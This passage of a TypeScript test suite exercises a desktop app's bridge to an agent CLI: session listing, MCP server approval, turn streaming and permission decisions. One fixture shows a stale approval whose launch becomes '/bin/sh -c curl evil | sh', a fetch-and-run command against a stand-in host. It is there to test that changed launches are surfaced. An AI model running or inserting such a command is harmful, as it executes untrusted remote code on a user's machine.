        ? { permissionMode: 'bypassPermissions', defaultEffort: 'extreme' }
        : defaultResponder(method, params),
    );

    const models = await service.readDeveloperModels(root.id);

    expect(models.defaultAgentMode).toBeNull();
    expect(models.defaultReasoningEffort).toBeNull();
  });

  it('asks the CLI to re-resolve reachability only when told to refresh', async () => {
    const asked: Array<Record<string, unknown>> = [];
    const { service } = await loadService((method, params) => {
      if (method === 'model/list') asked.push(params);
      return defaultResponder(method, params);
    });

    await service.readDeveloperModels(root.id);
    await service.readDeveloperModels(root.id, true);

    expect(asked).toEqual([{}, { refresh: true }]);
  });

  it('still answers when the CLI serves no models, settings or account', async () => {
    const { service } = await loadService((method) =>
      method === 'initialize' ? HANDSHAKE : { error: 'unsupported' },
    );

    const models = await service.readDeveloperModels(root.id);

    expect(models).toEqual({
      models: [],
      hostModels: [],
      defaultModelId: null,
      defaultAgentMode: null,
      defaultReasoningEffort: null,
      managedSignedIn: false,
      features: { maxTurns: false, memory: false },
    });
  });

  it('says a folder that is gone is gone, rather than blaming the CLI', async () => {
    const { service, spawn } = await loadService();
    statSync.mockImplementation(() => {
      throw new Error('ENOENT');
    });

    const list = await service.listDeveloperSessions();

    expect(spawn).not.toHaveBeenCalled();
    expect(list.groups[0]?.unavailable?.message).toContain('no longer on this Mac');
  });

  it('lists a folder with its branch and each session its origin and trust', async () => {
    const { service } = await loadService();

    const list = await service.listDeveloperSessions();
    const group = list.groups[0];

    expect(group?.name).toBe('project');
    expect(group?.branch).toBe('main');
    expect(group?.sessions[0]).toMatchObject({
      id: 'thread-1',
      rootId: root.id,
      title: 'Quote the readme',
      trustMode: 'byok',
      origin: 'cli',
    });
  });

  describe('project MCP servers waiting for approval', () => {
    const SERVERS = [
      { name: 'zeta', transport: 'stdio', scope: 'plugin', status: 'needs_approval' },
      { name: 'github', transport: 'stdio', scope: 'project', status: 'needs_approval' },
      { name: 'docs', transport: 'http', scope: 'project', status: 'needs_auth' },
      { name: 'mine', transport: 'stdio', scope: 'user', status: 'needs_approval' },
      { name: 'ready', transport: 'stdio', scope: 'project', status: 'configured' },
    ];
    const ASKED = {
      name: 'github',
      scope: 'project',
      question: "This project's MCP file starts server 'github': npx -y @acme/github-mcp.",
      fingerprint: 'f'.repeat(64),
    };

    function withApprovals(answer: Responder = () => undefined): Responder {
      return (method, params) => {
        if (method === 'initialize') {
          return { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, mcpApproval: true } };
        }
        if (method === 'mcp/list') return { servers: SERVERS };
        return answer(method, params) ?? defaultResponder(method);
      };
    }

    const sent = (children: FakeChild[], method: string) =>
      children.flatMap((child) => child.written).filter((entry) => entry.method === method);

    it('lists the ones a project names, by name, on a CLI that can be asked about them', async () => {
      const { service } = await loadService(withApprovals());

      const [group] = (await service.listDeveloperSessions()).groups;

      expect(group?.mcpAwaitingApproval).toEqual([
        { name: 'github', scope: 'project' },
        { name: 'zeta', scope: 'plugin' },
      ]);
      expect(group?.sessions).toHaveLength(1);
    });

    it('lists none, and asks for none, on a CLI that cannot be asked', async () => {
      const { service, children } = await loadService((method) =>
        method === 'mcp/list' ? { servers: SERVERS } : defaultResponder(method),
      );

      const [group] = (await service.listDeveloperSessions()).groups;

      expect(group).not.toHaveProperty('mcpAwaitingApproval');
      expect(sent(children, 'mcp/list')).toEqual([]);
      await expect(service.readDeveloperMcpApproval(root.id, 'github', 'project')).rejects.toThrow(
        /Update the AGI CLI/u,
      );
      await expect(service.grantDeveloperMcpApproval(root.id, ASKED as never)).rejects.toThrow(
        /Update the AGI CLI/u,
      );
      expect(sent(children, 'mcp/approval/read')).toEqual([]);
      expect(sent(children, 'mcp/approval/grant')).toEqual([]);
    });

    it('keeps the sessions of a folder whose server list cannot be read', async () => {
      const { service, children } = await loadService((method, params) =>
        method === 'mcp/list'
          ? new RpcFailure({ code: -32000, message: 'no' })
          : withApprovals()(method, params),
      );

      const [group] = (await service.listDeveloperSessions()).groups;

      expect(sent(children, 'mcp/list')).toHaveLength(1);
      expect(group?.sessions).toHaveLength(1);
      expect(group).not.toHaveProperty('mcpAwaitingApproval');
      expect(group).not.toHaveProperty('unavailable');
    });

    it('reads what the CLI would ask about one server, with the hash of that launch', async () => {
      const { service, children } = await loadService(
        withApprovals((method) => (method === 'mcp/approval/read' ? ASKED : undefined)),
      );

      expect(await service.readDeveloperMcpApproval(root.id, 'github', 'project')).toEqual({
        ...ASKED,
        launch: null,
      });
      expect(sent(children, 'mcp/approval/read')[0]?.params).toEqual({
        name: 'github',
        scope: 'project',
      });
    });

    const LOCAL_LAUNCH = {
      project: root.path,
      program: '/usr/local/bin/npx',
      args: ['-y', '@acme/github-mcp'],
      env: [
        { name: 'GITHUB_HOST', value: 'github.example.com' },
        { name: 'GITHUB_TOKEN' },
        { name: 'NODE_OPTIONS', value: '--require ./x.js', notPassed: true },
      ],
      workingFolder: root.path,
      files: ['package.json'],
      sandbox: 'kept_sandboxed',
      network: 'internet_and_local',
      headerNames: [],
    };

    it('reads a local launch in parts, with a value only where the CLI sent one', async () => {
      const { service } = await loadService(
        withApprovals((method) =>
          method === 'mcp/approval/read' ? { ...ASKED, launch: LOCAL_LAUNCH } : undefined,
        ),
      );

      const asked = await service.readDeveloperMcpApproval(root.id, 'github', 'project');

      expect(asked.launch).toEqual({
        project: root.path,
        program: '/usr/local/bin/npx',
        args: ['-y', '@acme/github-mcp'],
        env: [
          { name: 'GITHUB_HOST', value: 'github.example.com', notPassed: false },
          { name: 'GITHUB_TOKEN', value: null, notPassed: false },
          { name: 'NODE_OPTIONS', value: null, notPassed: true },
        ],
        workingFolder: root.path,
        files: ['package.json'],
        sandbox: 'kept_sandboxed',
        network: 'internet_and_local',
        url: null,
        headerNames: [],
        authorizeUrl: null,
        tokenUrl: null,
        oauthScope: null,
        oauthClientId: null,
        oauthRedirectUri: null,
        oauthClientSecretSet: false,
        askedAtEveryStart: false,
      });
    });

    // Whether a yes is remembered is the CLI's to say, in a field of its own.
    // Anything but a true there, and anything a file entry says, is a no.
    it('reads that a launch is asked about at every start only from a true in its own field', async () => {
      const marked = 'sh -c (not checked: it starts through a shell; asked at every start)';
      const read = async (extra: Record<string, unknown>) => {
        const { service } = await loadService(
          withApprovals((method) =>
            method === 'mcp/approval/read'
              ? { ...ASKED, launch: { ...LOCAL_LAUNCH, files: [marked], ...extra } }
              : undefined,
          ),
        );
        return (await service.readDeveloperMcpApproval(root.id, 'github', 'project')).launch;
      };

      expect((await read({ askedAtEveryStart: true }))?.askedAtEveryStart).toBe(true);
      for (const value of [undefined, false, 'true', 1, null]) {
        const launch = await read(value === undefined ? {} : { askedAtEveryStart: value });
        expect(launch?.askedAtEveryStart, String(value)).toBe(false);
        expect(launch?.files).toEqual([marked]);
      }
    });

    it('reads a remote launch, and marks a containment or a reach it has no word for as unknown', async () => {
      const { service } = await loadService(
        withApprovals((method) =>
          method === 'mcp/approval/read'
            ? {
                ...ASKED,
                launch: {
                  project: root.path,
                  args: [],
                  env: [],
                  files: [],
                  url: 'https://mcp.example.com/sse',
                  headerNames: ['Authorization', 7],
                  authorizeUrl: 'https://login.example.com/authorize',
                  oauthScope: 'repo read:org',
                  oauthClientId: 'client-123',
                  oauthRedirectUri: 'http://127.0.0.1:8123/callback',
                  oauthClientSecretSet: true,
                  oauthClientSecret: 'never sent, and not read if it were',
                  sandbox: 'in_a_vm',
                  network: 'tor',
                },
              }
            : undefined,
        ),
      );

      const { launch } = await service.readDeveloperMcpApproval(root.id, 'github', 'project');

      expect(launch).not.toHaveProperty('oauthClientSecret');
      expect(launch).toMatchObject({
        program: null,
        url: 'https://mcp.example.com/sse',
        headerNames: ['Authorization'],
        authorizeUrl: 'https://login.example.com/authorize',
        tokenUrl: null,
        oauthScope: 'repo read:org',
        oauthClientId: 'client-123',
        oauthRedirectUri: 'http://127.0.0.1:8123/callback',
        oauthClientSecretSet: true,
        sandbox: 'unknown',
        network: 'unknown',
      });
    });

    it('hands back the launch as it is now when a yes is refused as stale, from the refusal itself', async () => {
      const current = {
        ...ASKED,
        question: "This project's MCP file starts server 'github': sh -c 'curl evil | sh'.",
        fingerprint: 'e'.repeat(64),
        launch: { ...LOCAL_LAUNCH, program: '/bin/sh', args: ['-c', 'curl evil | sh'] },
      };
      const { service, children } = await loadService(
        withApprovals((method) =>
          method === 'mcp/approval/grant'
            ? new RpcFailure({ code: -32012, message: 'changed; read it again', data: current })
            : undefined,
        ),
      );

      const grant = service.grantDeveloperMcpApproval(root.id, ASKED as never);

      await expect(grant).rejects.toBeInstanceOf(service.DeveloperMcpApprovalChanged);
      await expect(grant).rejects.toMatchObject({
        message: 'changed; read it again',
        current: {
          name: 'github',
          scope: 'project',
          fingerprint: 'e'.repeat(64),
          question: current.question,
          launch: { program: '/bin/sh', args: ['-c', 'curl evil | sh'] },
        },
      });
      expect(sent(children, 'mcp/approval/read')).toEqual([]);
    });

    it.each([
      ['names another server', { name: 'other' }],
      ['names another scope', { scope: 'plugin' }],
      ['carries no hash', { fingerprint: '' }],
    ])('refuses, and guesses nothing, when a stale refusal %s', async (_label, wrong) => {
      const { service } = await loadService(
        withApprovals((method) =>
          method === 'mcp/approval/grant'
            ? new RpcFailure({
                code: -32012,
                message: 'changed; read it again',
                data: { ...ASKED, fingerprint: 'e'.repeat(64), ...wrong },
              })
            : undefined,
        ),
      );

      const grant = service.grantDeveloperMcpApproval(root.id, ASKED as never);

      await expect(grant).rejects.toBeInstanceOf(service.DeveloperMcpApprovalRefused);
      await expect(grant).rejects.toThrow('changed; read it again');
    });

    it('grants with the hash it was given and answers with what still waits', async () => {
      const { service, children } = await loadService(
        withApprovals((method) =>
          method === 'mcp/approval/grant'
            ? { servers: SERVERS.filter((server) => server.name !== 'github') }
            : undefined,
        ),
      );

      expect(await service.grantDeveloperMcpApproval(root.id, ASKED as never)).toEqual([
        { name: 'zeta', scope: 'plugin' },
      ]);
      expect(sent(children, 'mcp/approval/grant')[0]?.params).toEqual({
        name: 'github',
        scope: 'project',
        fingerprint: ASKED.fingerprint,
      });
    });

    it('passes on the CLI own reason when it will not ask or will not record the answer', async () => {
      const stale = "MCP server 'github': it is not started, it runs only in the sandbox";
      const { service } = await loadService(
        withApprovals((method) => {
          if (method === 'mcp/approval/read') {
            return new RpcFailure({
              code: -32009,
              message: "MCP server 'github' is already approved for this project",
            });
          }
          if (method === 'mcp/approval/grant') {
            return new RpcFailure({ code: -32009, message: stale });
          }
          return undefined;
        }),
      );

      const read = service.readDeveloperMcpApproval(root.id, 'github', 'project');
      await expect(read).rejects.toBeInstanceOf(service.DeveloperMcpApprovalRefused);
      await expect(read).rejects.toThrow('already approved for this project');
      const grant = service.grantDeveloperMcpApproval(root.id, ASKED as never);
      await expect(grant).rejects.toBeInstanceOf(service.DeveloperMcpApprovalRefused);
      await expect(grant).rejects.toThrow(stale);
    });

    it('treats an answer with no question or no hash as nothing to allow', async () => {
      const { service } = await loadService(
        withApprovals((method) =>
          method === 'mcp/approval/read' ? { ...ASKED, fingerprint: '' } : undefined,
        ),
      );

      await expect(
        service.readDeveloperMcpApproval(root.id, 'github', 'project'),
      ).rejects.toBeInstanceOf(service.DeveloperMcpApprovalRefused);
    });
  });

  it('carries why git state was withheld for a folder, with no branch', async () => {
    const reason = 'its repository settings run programs (filter.lfs.clean in .git/config)';
    readWorkspaceGit.mockResolvedValueOnce({ git: null, unavailableReason: reason });
    const { service } = await loadService();

    const group = (await service.listDeveloperSessions()).groups[0];

    expect(group?.branch).toBeNull();
    expect(group?.gitUnavailableReason).toBe(reason);
  });

  it('reports the surface the CLI recorded, which is this shell for its own', async () => {
    const { service } = await loadService((method) =>
      method === 'initialize'
        ? HANDSHAKE
        : method === 'thread/start'
          ? { thread: { ...thread, id: 'thread-new', createdBy: 'desktop' } }
          : defaultResponder(method),
    );

    const started = await service.startDeveloperSession(root.id);

    expect(started.origin).toBe('desktop');
  });

  it('names this shell agi-desktop at initialize, which is what the CLI records', async () => {
    const { service, children } = await loadService();

    await service.listDeveloperSessions();

    expect(children[0]?.written[0]).toMatchObject({
      method: 'initialize',
      params: { clientInfo: { name: 'agi-desktop' } },
    });
  });

  it('streams a turn as started, deltas and a finish', async () => {
    const { service, children, events } = await loadService();

    const { turnId } = await service.startDeveloperTurn({
      rootId: root.id,
      threadId: thread.id,
      text: 'hello',
    });
    const child = children[0];
    child?.notify('turn/started', { threadId: thread.id, turnId });
    child?.notify('turn/output_delta', { threadId: thread.id, turnId, delta: 'desktop ' });
    child?.notify('turn/output_delta', { threadId: thread.id, turnId, delta: 'leg ok' });
    child?.notify('turn/completed', {
      threadId: thread.id,
      turnId,
      status: 'completed',
      response: 'desktop leg ok',
      failure: null,
    });

    expect(turnId).toBe('turn-1');
    expect(events.map((entry) => entry.event.type)).toEqual([
      'turn-started',
      'output-delta',
      'output-delta',
      'turn-finished',
    ]);
    expect(events.every((entry) => entry.rootId === root.id)).toBe(true);
    expect(events[3]?.event).toMatchObject({ outcome: 'completed', response: 'desktop leg ok' });
  });

  it('carries a tool call through as a started and finished pair', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'read it' });
    children[0]?.notify('turn/agent_event', {
      schemaVersion: AGENT_EVENT_SCHEMA_VERSION,
      sessionId: thread.id,
      turnId: 'turn-1',
      sequence: 0,
      emittedAtMs: 1,
      event: {
        type: 'tool-execution-start',
        toolCallId: 'call-1',
        name: 'read_file',
        category: 'filesystem',
        summary: 'Read README.md',
        input: {},
      },
    });
    children[0]?.notify('turn/agent_event', {
      schemaVersion: AGENT_EVENT_SCHEMA_VERSION,
      sessionId: thread.id,
      turnId: 'turn-1',
      sequence: 1,
      emittedAtMs: 2,
      event: {
        type: 'tool-execution-end',
        toolCallId: 'call-1',
        name: 'read_file',
        output: '# QA project',
        isError: false,
      },
    });

    expect(events.map((entry) => entry.event.type)).toEqual(['tool-started', 'tool-finished']);
    expect(events[0]?.event).toMatchObject({ summary: 'Read README.md', toolCallId: 'call-1' });
    expect(events[1]?.event).toMatchObject({ output: '# QA project', isError: false });
  });

  it('carries the queue, the command line, each changed file and the turn diff through', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'build it' });
    const notify = (sequence: number, event: Record<string, unknown>): void => {
      children[0]?.notify('turn/agent_event', {
        schemaVersion: 5,
        sessionId: thread.id,
        turnId: 'turn-1',
        sequence,
        emittedAtMs: sequence,
        event,
      });
    };

    notify(0, {
      type: 'tool-execution-queued',
      toolCallId: 'call-1',
      name: 'run_command',
      category: 'shell',
      position: 0,
      queueDepth: 2,
    });
    notify(1, {
      type: 'command-started',
      toolCallId: 'call-1',
      command: 'pnpm build',
      cwd: '/repo',
    });
    notify(2, {
      type: 'file-changed',
      toolCallId: 'call-2',
      path: '/repo/dist/index.js',
      change: 'created',
    });
    notify(3, {
      type: 'file-changed',
      toolCallId: 'call-2',
      path: '/repo/dist/index.js',
      change: 'not-a-change',
    });
    notify(4, {
      type: 'turn-diff',
      unifiedDiff: '--- a/x\n+++ b/x\n+one',
      paths: ['x'],
    });

    expect(events.map((entry) => entry.event.type)).toEqual([
      'tool-queued',
      'command-started',
      'file-changed',
      'turn-diff',
    ]);
    expect(events[0]?.event).toMatchObject({ toolCallId: 'call-1', position: 0, queueDepth: 2 });
    expect(events[1]?.event).toMatchObject({ command: 'pnpm build', cwd: '/repo' });
    expect(events[2]?.event).toMatchObject({ path: '/repo/dist/index.js', change: 'created' });
    expect(events[3]?.event).toMatchObject({ unifiedDiff: '--- a/x\n+++ b/x\n+one', paths: ['x'] });
  });

  it('carries the structured failure the CLI sends through to the surface', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'ping' });
    children[0]?.notify('turn/failed', {
      threadId: thread.id,
      turnId: 'turn-1',
      status: 'failed',
      response: '',
      error: '[a-provider] Authentication failed.',
      failure: {
        code: 'provider_auth_missing',
        message: '[a-provider] Authentication failed.',
        provider: 'a-provider',
        action: 'sign_in_provider',
        retryable: false,
      },
    });

    expect(events.at(-1)?.event).toMatchObject({
      type: 'turn-finished',
      outcome: 'failed',
      failure: { code: 'provider_auth_missing', provider: 'a-provider', retryable: false },
    });
  });

  it('builds a failure from the legacy string when a CLI sends no failure object', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'ping' });
    children[0]?.notify('turn/failed', {
      threadId: thread.id,
      turnId: 'turn-1',
      status: 'failed',
      response: '',
      error: 'Something went wrong.',
    });

    expect(events.at(-1)?.event).toMatchObject({
      type: 'turn-finished',
      failure: { code: 'unknown', message: 'Something went wrong.', action: 'none' },
    });
  });

  it('relays the command rule the CLI proposes with an approval, and only a well-formed one', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'test it' });
    const request = {
      threadId: thread.id,
      turnId: 'turn-1',
      kind: 'Exec { command: "pnpm test" }',
      summary: 'Run pnpm test',
      detail: 'pnpm test',
    };
    children[0]?.notify('approval/requested', {
      ...request,
      requestId: 'ask-1',
      proposedExecpolicyAmendment: ['pnpm', 'test'],
    });
    children[0]?.notify('approval/requested', {
      ...request,
      requestId: 'ask-2',
      proposedExecpolicyAmendment: ['pnpm', ''],
    });

    expect(events[0]?.event).toMatchObject({
      type: 'approval-requested',
      requestId: 'ask-1',
      proposedCommandPrefix: ['pnpm', 'test'],
    });
    expect(events[1]?.event).not.toHaveProperty('proposedCommandPrefix');
  });

  it('surfaces an approval request and sends the answer back', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'build it' });
    children[0]?.notify('approval/requested', {
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-1',
      kind: 'Exec { command: "pnpm build --filter \\"web\\"" }',
      summary: 'Run pnpm build',
      detail: 'pnpm build',
      riskLevel: 'medium',
      reversible: false,
    });

    await service.answerDeveloperApproval({
      rootId: root.id,
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-1',
      decision: 'approve_once',
    });

    expect(events[0]?.event).toEqual({
      type: 'approval-requested',
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-1',
      kind: 'Exec',
      summary: 'Run pnpm build',
      detail: 'pnpm build',
      command: 'pnpm build --filter "web"',
      riskLevel: 'medium',
      reversible: false,
    });
    expect(children[0]?.written).toContainEqual({
      method: 'approval/respond',
      params: { threadId: thread.id, turnId: 'turn-1', requestId: 'ask-1', decision: 'approved' },
    });
    expect(events[1]?.event).toMatchObject({
      type: 'approval-answered',
      decision: 'approve_once',
      approved: true,
    });
  });

  it('names no command for a request that is not one, and no risk it was not told', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'edit it' });
    children[0]?.notify('approval/requested', {
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-2',
      kind: 'FileWrite { path: "/approved/project/a.ts" }',
      summary: 'Write a.ts',
      detail: '',
    });

    expect(events[0]?.event).toMatchObject({
      kind: 'FileWrite',
      command: null,
      riskLevel: null,
      reversible: null,
    });
  });

  it('sends each decision as the wire value the CLI maps', async () => {
    const { service, children } = await loadService();
    const base = { rootId: root.id, threadId: thread.id, turnId: 'turn-1', requestId: 'ask-1' };

    await service.answerDeveloperApproval({ ...base, decision: 'approve_for_session' });
    await service.answerDeveloperApproval({
      ...base,
      decision: 'always_allow_command',
      commandPrefix: ['pnpm', 'build'],
    });
    await service.answerDeveloperApproval({ ...base, decision: 'deny' });

    expect(
      children[0]?.written
        .filter((entry) => entry.method === 'approval/respond')
        .map((entry) => entry.params['decision']),
    ).toEqual([
      'approved_for_session',
      { approved_execpolicy_amendment: { proposed_execpolicy_amendment: ['pnpm', 'build'] } },
      'denied',
    ]);
  });

  it('refuses a deny-and-stop and then interrupts the turn the CLI would carry on', async () => {
    const { service, children, events } = await loadService();

    await service.answerDeveloperApproval({
      rootId: root.id,
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-1',
      decision: 'deny_and_stop',
    });

    const sent = children[0]?.written.filter((entry) => entry.method !== 'initialize');
    expect(sent?.map((entry) => [entry.method, entry.params['decision'] ?? null])).toEqual([
      ['approval/respond', 'abort'],
      ['turn/interrupt', null],
    ]);
    expect(events[0]?.event).toMatchObject({ decision: 'deny_and_stop', approved: false });
  });

  it('names a posture on every turn, so none inherits the last one the CLI ran in', async () => {
    const { service, children } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'carry on' });

    expect(
      children[0]?.written.find((entry) => entry.method === 'turn/start')?.params['agentMode'],
    ).toBe('ask');
  });

  it("runs a paired phone's turn in the thread's saved mode, and never in Bypass permissions", async () => {
    const { service, children } = await loadService((method) =>
      method === 'initialize'
        ? { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, bypassPerTurn: true } }
        : defaultResponder(method),
    );

    await service.startRemoteDeveloperTurn({
      rootId: root.id,
      threadId: thread.id,
      text: 'from the phone',
      agentMode: 'bypass',
    });
    await service.startRemoteDeveloperTurn({
      rootId: root.id,
      threadId: thread.id,
      text: 'again',
      agentMode: 'plan',
    });
    await service.startRemoteDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'more' });

    expect(
      children
        .flatMap((child) => child.written)
        .filter((entry) => entry.method === 'turn/start')
        .map((entry) => entry.params['agentMode']),
    ).toEqual([undefined, 'plan', undefined]);
  });

  it("tells a CLI that keeps its last turn's mode to ask on a paired phone's turn", async () => {
    const { service, children } = await loadService();

    await service.startRemoteDeveloperTurn({
      rootId: root.id,
      threadId: thread.id,
      text: 'from the phone',
      agentMode: 'bypass',
    });
    await service.startRemoteDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'more' });

    expect(
      children
        .flatMap((child) => child.written)
        .filter((entry) => entry.method === 'turn/start')
        .map((entry) => entry.params['agentMode']),
    ).toEqual(['ask', 'ask']);
  });

  // Changing the CLI path leaves folders already running the old program
  // beside ones started with the new, and each is asked only for what it
  // said itself that it serves.
  it('reads what a CLI serves from the process that will answer, not from the last one to start', async () => {
    const newer: WorkspaceRoot = { ...root, id: 'root-2', path: '/approved/newer', name: 'newer' };
    getRoot.mockImplementation((id) => (id === newer.id ? newer : root));
    let handshakes = 0;
    const { service, children } = await loadService((method) => {
      if (method !== 'initialize') return defaultResponder(method);
      handshakes += 1;
      return handshakes === 1
        ? { ...HANDSHAKE, capabilities: BASE_CAPABILITIES }
        : { ...HANDSHAKE, capabilities: { ...HANDSHAKE.capabilities, bypassPerTurn: true } };
    });
    const turn = (rootId: string) =>
      service.startRemoteDeveloperTurn({ rootId, threadId: thread.id, text: 'from the phone' });

    try {
      await turn(root.id);
      await turn(newer.id);
      await turn(root.id);

      expect(
        children.map((child) =>
          child.written
            .filter((entry) => entry.method === 'turn/start')
            .map((entry) => entry.params['agentMode']),
        ),
      ).toEqual([['ask', 'ask'], [undefined]]);
      await expect(service.listDeveloperCheckpoints(root.id, thread.id)).rejects.toThrow(
        /Update the AGI CLI/u,
      );
      expect(children[0]?.written.map((entry) => entry.method)).not.toContain('checkpoint/list');
    } finally {
      getRoot.mockReturnValue(root);
    }
  });

  it('sends the chosen posture, effort, context files and images with the turn', async () => {
    const { service, children } = await loadService();

    await service.startDeveloperTurn({
      rootId: root.id,
      threadId: thread.id,
      text: 'look at this',
      agentMode: 'plan',
      reasoningEffort: 'max',
      contextFiles: ['src/app.ts'],
      images: ['data:image/png;base64,AAAA'],
    });

    expect(children[0]?.written.find((entry) => entry.method === 'turn/start')?.params).toEqual({
      threadId: thread.id,
      input: [
        { type: 'text', text: 'look at this', text_elements: [] },
        { type: 'image', image_url: 'data:image/png;base64,AAAA' },
      ],
      cwd: root.path,
      agentMode: 'plan',
      reasoningEffort: 'max',
      contextFiles: ['src/app.ts'],
    });
  });

  it('relays a question the agent asked and sends the answer or a cancel back', async () => {
    const { service, children, events } = await loadService();
    const ids = { threadId: thread.id, turnId: 'turn-1', requestId: 'q-1' };

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'go' });
    children[0]?.notify('userInput/requested', { ...ids, question: 'Which branch?' });
    await service.answerDeveloperUserInput({ rootId: root.id, ...ids, answer: 'main' });
    await service.answerDeveloperUserInput({ rootId: root.id, ...ids, answer: null });

    expect(events[0]?.event).toEqual({
      type: 'user-input-requested',
      ...ids,
      question: 'Which branch?',
    });
    expect(
      children[0]?.written
        .filter((entry) => entry.method === 'userInput/respond')
        .map((entry) => entry.params),
    ).toEqual([
      { ...ids, answer: 'main' },
      { ...ids, answer: null },
    ]);
    expect(events.slice(1).map((entry) => entry.event)).toEqual([
      { type: 'user-input-answered', ...ids, cancelled: false },
      { type: 'user-input-answered', ...ids, cancelled: true },
    ]);
  });

  // A page from before questions existed cannot show one, and the CLI would
  // wait ten minutes for an answer that never comes.
  it('cancels a question at once when no page or phone can answer it', async () => {
    const { service, children, events } = await loadService(
      defaultResponder,
      undefined,
      () => false,
    );
    const ids = { threadId: thread.id, turnId: 'turn-1', requestId: 'q-1' };

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'go' });
    children[0]?.notify('userInput/requested', { ...ids, question: 'Which branch?' });

    expect(
      children[0]?.written
        .filter((entry) => entry.method === 'userInput/respond')
        .map((entry) => entry.params),
    ).toEqual([{ ...ids, answer: null }]);
    expect(events.some((entry) => entry.event.type === 'user-input-requested')).toBe(false);
  });

  it('steers the running turn and reports when the CLI took it', async () => {
    const { service, children, events } = await loadService();

    const { turnId } = await service.steerDeveloperTurn({
      rootId: root.id,
      threadId: thread.id,
      turnId: 'turn-1',
      text: 'use the other file',
    });
    children[0]?.notify('turn/steered', { threadId: thread.id, turnId: 'turn-1' });

    expect(turnId).toBe('turn-1');
    expect(children[0]?.written.find((entry) => entry.method === 'turn/steer')?.params).toEqual({
      threadId: thread.id,
      input: [{ type: 'text', text: 'use the other file', text_elements: [] }],
      expectedTurnId: 'turn-1',
    });
    expect(events.at(-1)?.event).toEqual({
      type: 'turn-steered',
      threadId: thread.id,
      turnId: 'turn-1',
    });
  });

  it('carries a question and the chosen option between the agent and the page', async () => {
    const { service, children, events } = await loadService();

    await service.startDeveloperTurn({ rootId: root.id, threadId: thread.id, text: 'test it' });
    children[0]?.notify('approval/requested', {
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-2',
      kind: 'Question',
      summary: 'The agent has a question',
      detail: '',
      question: { question: 'Which suite?', options: ['unit', 'e2e'] },
    });

    await service.answerDeveloperApproval({
      rootId: root.id,
      threadId: thread.id,
      turnId: 'turn-1',
      requestId: 'ask-2',
      decision: 'approve_once',
      note: 'e2e',
    });

    expect(events[0]?.event).toMatchObject({
      type: 'approval-requested',
      question: { question: 'Which suite?', options: ['unit', 'e2e'] },
    });
    expect(children[0]?.written).toContainEqual({
      method: 'approval/respond',
      params: {
        threadId: thread.id,
        turnId: 'turn-1',
        requestId: 'ask-2',
        decision: 'approved',
        note: 'e2e',
      },
    });
  });

  it('stops every runtime on quit and says so', async () => {
    const { service, children, events } = await loadService();
    await service.listDeveloperSessions();

    service.stopAllDeveloperRuntimes();

    expect(children[0]?.ended).toBe(true);
    expect(events.at(-1)?.event.type).toBe('runtime-stopped');
  });

  it('stops the runtime of a folder that is no longer approved', async () => {
    const { service, children, spawn } = await loadService();
    await service.listDeveloperSessions();

    service.stopDeveloperRuntime(root.id);
    await service.listDeveloperSessions();

    expect(children[0]?.ended).toBe(true);
    expect(spawn).toHaveBeenCalledTimes(2);
  });

  it('reads the running turn with the approvals and questions it waits on', async () => {
    const { service, children } = await loadService((method, params) =>
      method === 'thread/reconnect'
        ? {
            thread,
            activeTurn: {
              turnId: 'turn-live',
              partialResponse: 'half',
              nextDeltaIndex: 1,
              nextEventSequence: 2,
              pendingApprovals: [
                {
                  requestId: 'ask-1',
                  kind: 'Exec { command: "cargo test" }',
                  summary: 'Run tests',
                  detail: 'cargo test',
                  riskLevel: 'medium',
                  reversible: true,
                },
              ],
              pendingUserInputs: [{ requestId: 'q-1', question: 'Which branch?' }],
            },
          }
        : defaultResponder(method, params),
    );

    const transcript = await service.readDeveloperSession(root.id, thread.id);

    expect(children[0]?.written.map((entry) => entry.method)).toContain('thread/reconnect');
    expect(transcript.activeTurn).toEqual({
      turnId: 'turn-live',
      partialResponse: 'half',
      approvals: [
        {
          requestId: 'ask-1',
          kind: 'Exec',
          summary: 'Run tests',
          detail: 'cargo test',
          command: 'cargo test',
          riskLevel: 'medium',
          reversible: true,
        },
      ],
      questions: [{ requestId: 'q-1', question: 'Which branch?' }],
    });
  });

  it('reads no running turn when the CLI reports none', async () => {
    const { service } = await loadService();

    expect((await service.readDeveloperSession(root.id, thread.id)).activeTurn).toBeNull();
  });

  it('tells the CLI at initialize that this shell answers the agent questions', async () => {
    const { service, children } = await loadService();

    await service.readDeveloperSession(root.id, thread.id);

    expect(children[0]?.written[0]).toMatchObject({
      method: 'initialize',
      params: { userInput: true },
    });
  });

  it('reads the worktree count without starting a CLI, and through one already running', async () => {
    const { service, spawn, children } = await loadService((method, params) =>
      method === 'worktree/keep'
        ? { keep: params['keep'] ?? 15, maxKeep: 100 }
        : defaultResponder(method),
    );

    await expect(service.developerWorktreeKeep(root.id)).resolves.toBeNull();
    expect(spawn).not.toHaveBeenCalled();

    await service.listDeveloperSessions();
    await expect(service.developerWorktreeKeep(root.id)).resolves.toEqual({
      keep: 15,
      maxKeep: 100,
    });
    await expect(service.developerWorktreeKeep(root.id, 4)).resolves.toEqual({
      keep: 4,
      maxKeep: 100,
    });
